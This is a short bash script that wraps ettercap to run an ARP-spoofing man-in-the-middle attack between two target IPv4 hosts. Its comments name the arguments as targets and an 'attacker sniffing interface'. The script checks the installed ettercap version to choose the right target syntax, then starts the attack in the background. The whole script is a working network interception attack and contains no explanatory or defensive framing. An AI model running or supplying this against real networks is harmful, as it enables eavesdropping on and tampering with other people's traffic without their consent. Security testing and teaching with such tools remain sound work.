#!/bin/bash

# $1 first target IPv4
# $2 second target IPv4
# $3 attacker sniffing interface

# ipv6command=ettercap --help|grep -q 'MAC/IP/IPv6/PORT'

ettercap --help |grep -q 'MAC/IP/IPv6/PORT'
ipv6command=$?

if [[ $ipv6command -eq 0 ]]; then
    ettercap -T -M arp:remote /$1// /$2// -i $3 &
else
    ettercap -T -M arp:remote /$1/ /$2/ -i $3 &
fi
